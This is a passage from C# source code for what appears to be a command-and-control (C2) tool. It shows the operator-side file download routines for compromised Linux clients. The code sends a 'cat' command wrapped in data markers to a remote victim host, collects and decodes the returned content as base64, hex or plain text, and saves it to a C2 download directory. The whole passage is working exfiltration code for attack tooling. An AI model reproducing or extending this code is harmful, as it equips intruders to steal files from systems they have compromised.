                        RaiseOutputMessage("[!] Failed to decode hex data", Color.Red);
                    }
                }
                else
                {
                    RaiseOutputMessage("[!] Could not find hex data markers", Color.Red);
                }
            }
            catch (Exception ex)
            {
                RaiseOutputMessage($"[!] Error in hex download: {ex.Message}", Color.Red);
            }
        }

        private async Task DownloadFileLinuxCat(ClientHandler activeClient, string remotePath, string downloadPath)
        {
            try
            {
                RaiseOutputMessage("[*] Using cat for text file download (binary files may be corrupted)...", Color.Yellow);

                activeClient.SendCommand($"echo 'BEGIN_FILE_DATA' && cat \"{remotePath}\" && echo 'END_FILE_DATA'");

                // Wait for completion
                const int maxWaitTimeMs = 180000; // 3 minutes
                int elapsedMs = 0;
                const int checkIntervalMs = 500;
                bool transferComplete = false;
                StringBuilder fileData = new StringBuilder();

                while (elapsedMs < maxWaitTimeMs && !transferComplete)
                {
                    await Task.Delay(checkIntervalMs);
                    elapsedMs += checkIntervalMs;

                    string response = activeClient.GetLastResponse();
                    if (response != null)
                    {
                        if (response.Contains("END_FILE_DATA"))
                        {
                            transferComplete = true;
                        }
                        fileData.Append(response);
                    }
                }

                if (!transferComplete)
                {
                    RaiseOutputMessage("[!] Transfer timeout", Color.Red);
                    return;
                }

                // Extract file content
                string fullResponse = fileData.ToString();
                int startIndex = fullResponse.IndexOf("BEGIN_FILE_DATA");
                int endIndex = fullResponse.IndexOf("END_FILE_DATA");

                if (startIndex >= 0 && endIndex > startIndex)
                {
                    string fileContent = fullResponse.Substring(startIndex + "BEGIN_FILE_DATA".Length, endIndex - startIndex - "BEGIN_FILE_DATA".Length);

                    // Save as text file
                    await SaveTextFileLinux(fileContent, remotePath, downloadPath);
                }
                else
                {
                    RaiseOutputMessage("[!] Could not find file data markers", Color.Red);
                }
            }
            catch (Exception ex)
            {
                RaiseOutputMessage($"[!] Error in cat download: {ex.Message}", Color.Red);
            }
        }

        private async Task SaveDecodedFileLinux(string base64Data, string remotePath, string downloadPath)
        {
            try
            {
                byte[] fileBytes = Convert.FromBase64String(base64Data);
                await SaveBinaryFileLinux(fileBytes, remotePath, downloadPath);
            }
            catch (Exception ex)
            {
                RaiseOutputMessage($"[!] Error decoding base64: {ex.Message}", Color.Red);
            }
        }

        private async Task SaveBinaryFileLinux(byte[] fileBytes, string remotePath, string downloadPath)
        {
            try
            {
                string fileName = Path.GetFileName(remotePath);
                string sanitizedFileName = string.Join("_", fileName.Split(Path.GetInvalidFileNameChars()));

                string saveDir = downloadPath ?? GetC2DownloadDirectory();
                if (!Directory.Exists(saveDir))
                {
                    Directory.CreateDirectory(saveDir);
                }

                string finalPath = Path.Combine(saveDir, sanitizedFileName);
                await File.WriteAllBytesAsync(finalPath, fileBytes);

                TimeSpan downloadTime = DateTime.Now - _downloadStartTime;
                string timeString = downloadTime.TotalSeconds < 60
                    ? $"{downloadTime.TotalSeconds:F1} seconds"
                    : $"{downloadTime.Minutes}m {downloadTime.Seconds}s";

                RaiseOutputMessage($"[+] File downloaded successfully: {finalPath}", Color.Green);
                RaiseOutputMessage($"[+] Size: {FormatFileSize(fileBytes.Length)}, Time: {timeString}", Color.Green);

                // Open folder containing the downloaded file
                try
                {
                    System.Diagnostics.Process.Start("explorer.exe", $"/select, \"{finalPath}\"");
                }
                catch { }
            }
            catch (Exception ex)
            {
                RaiseOutputMessage($"[!] Error saving file: {ex.Message}", Color.Red);
            }
        }

        private async Task SaveTextFileLinux(string content, string remotePath, string downloadPath)
        {
            try
            {
                string fileName = Path.GetFileName(remotePath);
                string sanitizedFileName = string.Join("_", fileName.Split(Path.GetInvalidFileNameChars()));

                string saveDir = downloadPath ?? GetC2DownloadDirectory();

                if (!Directory.Exists(saveDir))
                {
                    Directory.CreateDirectory(saveDir);
                }

                string finalPath = Path.Combine(saveDir, sanitizedFileName);
                await File.WriteAllTextAsync(finalPath, content);

                RaiseOutputMessage($"[+] Text file downloaded: {finalPath}", Color.Green);

                try
                {
                    System.Diagnostics.Process.Start("explorer.exe", $"/select, \"{finalPath}\"");
                }
                catch { }
            }
            catch (Exception ex)
            {
                RaiseOutputMessage($"[!] Error saving text file: {ex.Message}", Color.Red);
            }
        }

        private byte[] HexStringToBytes(string hexString)
        {
            try
            {
                if (hexString.Length % 2 != 0)
                    return null;

                byte[] bytes = new byte[hexString.Length / 2];
                for (int i = 0; i < bytes.Length; i++)
                {
                    bytes[i] = Convert.ToByte(hexString.Substring(i * 2, 2), 16);
                }
                return bytes;
            }
            catch
            {
                return null;
            }
        }

        #endregion
    }
}